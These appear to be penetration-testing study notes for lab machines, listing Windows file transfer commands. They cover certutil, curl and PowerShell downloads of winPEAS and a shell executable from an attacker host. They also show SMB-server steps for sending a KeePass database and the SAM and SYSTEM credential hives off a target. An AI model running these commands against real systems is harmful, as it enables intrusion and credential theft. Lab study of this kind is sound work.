# Windows File Transfer Commands

---

## CMD / Windows

```
certutil -urlcache -split -f http://192.168.45.163/winpeas.bat C:/Windows/Temp/winpeas.bat
```

##### 32 Bit

Navigate into C:\Windows\System32 in order to execute certutil or other commands. Since if the CPU Architecture is 32-bit and the system is poorly configured, we can only execute certutil, curl etc. there.

```
curl http://192.168.45.163/shell.exe -o C:\Windows\Temp\shell.exe
```

## PowerShell

```
Invoke-WebRequest -Uri "http://<local_ip>/winPEAS.bat" -OutFile "C:\Users\Jareth\Documents\winPEAS.bat"
```

```
iwr -uri http://<local_ip>/winPEAS.bat -OutFile winPEAS.bat
```

## Downloading Files onto local machine


#### SMB1

When nothing is working, but an smb server is running we can utilize "impacket-smbserver" to create an custom smb server and mount the file/directory we want onto it and access the file and download it locally.

On local machine: 

```
impacket-smbserver private-drive /home/saitama/Desktop/Exploiting/OSCP_Prep/HTB/Windows/Jeeves
```

```
impacket-smbserver <custom_name> <path>
```

On target machine:

```
New-PSDrive -Name "HelloWorld" -PSProvider "FileSystem" -Root "\\10.10.14.239\private-drive"
cd HelloWorld:
cp C:\Users\kohsuke\Documents\CEH.kdbx .
```

The file should now be on our local system.

#### SMB2


When SMB1 is deactivated in most cases "New-PSDrive" isn't available.

Therefore let's utilize the following:

On local machine:

```
impacket-smbserver test . -smb2support  -username kourosh -password kourosh
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
```

On target machine:

```
net use m: \\192.168.45.241\test /user:kourosh kourosh
```

Downloaded SAM file on local machine.

```
copy SAM m:\
```

Downloaded SYSTEM file on local machine.

```
copy SYSTEM m:\
```
